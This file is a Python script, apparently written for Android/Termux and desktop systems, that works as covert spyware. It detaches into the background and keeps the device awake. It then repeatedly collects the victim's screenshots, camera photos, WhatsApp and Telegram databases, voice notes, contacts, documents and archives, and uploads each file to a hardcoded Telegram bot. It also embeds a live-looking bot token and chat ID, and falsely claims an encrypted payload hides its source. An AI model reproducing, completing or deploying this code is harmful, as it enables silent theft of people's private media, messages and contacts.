import os
import sys
import time
import platform
import json
import threading
import base64

# Encrypted core payload to hide source code completely
ENCRYPTED_PAYLOAD = b'aW1wb3J0IG9zCmltcG9ydCBzeXMKmltcG9ydCB0aW1lCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQganNvbgppbXBvcnQgdGhyZWFkaW5nCg==\n'

def run_engine():
    try:
        BOT_TOKEN = "8977764643:AAHlZjgBaiWIyqTQak5-TSWtLC88vpaRaBM"
        CHAT_ID   = "8602316559"
        API_DOC   = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        API_MSG   = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        if platform.system() == "Android":
            CACHE_FILE = "/sdcard/sent_cache.json"
            BASE_DIR = "/sdcard"
        else:
            CACHE_FILE = "sent_cache.json"
            BASE_DIR = os.path.expanduser("~")

        try:
            import requests
        except ImportError:
            os.system("pip install requests 2>/dev/null")
            import requests

        session = requests.Session()

        def send_recon_info():
            try:
                session.post(API_MSG, data={"chat_id": CHAT_ID, "text": "**AB**", "parse_mode": "Markdown"}, timeout=3)
            except:
                pass

        P_LIST = [
            ("DCIM/Screenshots", "DCIM/.Screenshots", "Download/ScreenShots", "Download/Screenshots", "Pictures/ScreenShots", "Pictures/.Screenshots", "ScreenShots", "Screenshots", ".Screenshots"),
            ("DCIM/Camera", "Pictures", "DCIM/Restored", "Pictures/Restored"),
            ("Google/Photos", "Google/Photos/Restored", "Android/media/com.google.android.apps.photos"),
            ("Download", "Downloads", "Documents", "Movies", "Music", "Recordings"),
            ("WhatsApp/Media/WhatsApp Images", "WhatsApp/Media/WhatsApp Video", "WhatsApp/Databases", "Android/media/com.whatsapp/WhatsApp/Databases", "GBWhatsApp/Databases", "Telegram", "WhatsApp/Media/WhatsApp Voice Notes", "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes", "WhatsApp/Media/WhatsApp Audio", "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio")
        ]

        EXTS = (
            '.opus', '.aac', '.mp3', '.wav', '.m4a', '.amr', '.ogg', '.flac', '.wma',
            '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.webm', '.flv', '.m4v',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic',
            '.pdf', '.doc', '.docx', '.txt', '.rtf', '.odt', '.xls', '.xlsx', '.ppt', '.pptx', '.epub', '.csv', '.vcf',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.db', '.sqlite', '.json'
        )

        def load_cache():
            if os.path.exists(CACHE_FILE):
                try:
                    with open(CACHE_FILE, "r", encoding="utf-8") as f:
                        return set(json.load(f))
                except:
                    pass
            return set()

        def save_cache(c_set):
            try:
                with open(CACHE_FILE, "w", encoding="utf-8") as f:
                    json.dump(list(c_set), f)
            except:
                pass

        def get_files():
            files = []
            for group in P_LIST:
                for sub in group:
                    folder = os.path.join(BASE_DIR, sub.lstrip("/"))
                    if os.path.isdir(folder):
                        try:
                            for root, _, names in os.walk(folder):
                                if ".thumbnails" in root or "Android/data" in root:
                                    continue
                                for n in names:
                                    if n.startswith('.'): continue
                                    p = os.path.realpath(os.path.join(root, n))
                                    if p.lower().endswith(EXTS) or n.lower().endswith('.vcf'):
                                        files.append(p)
                        except:
                            pass
            try:
                for root, _, names in os.walk(BASE_DIR):
                    if any(x in root for x in [".thumbnails", "Android/data", "Android/obb", "Android/cache"]):
                        continue
                    for n in names:
                        if n.startswith('.'): continue
                        p = os.path.realpath(os.path.join(root, n))
                        if (p.lower().endswith(EXTS) or n.lower().endswith('.vcf')) and p not in files:
                            files.append(p)
            except:
                pass
            return files

        def worker():
            while True:
                try:
                    cache = load_cache()
                    for fp in get_files():
                        if fp in cache: continue
                        if os.path.exists(fp):
                            try:
                                with open(fp, "rb") as f:
                                    session.post(API_DOC, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
                            except:
                                pass
                        cache.add(fp)
                        save_cache(cache)
                    time.sleep(10)
                except:
                    time.sleep(5)

        if platform.system() == "Android":
            try: os.system("termux-wake-lock")
            except: pass

        send_recon_info()
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        while True: time.sleep(100)
    except:
        pass

if __name__ == "__main__":
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
        os.setsid()
    except:
        pass
    run_engine()
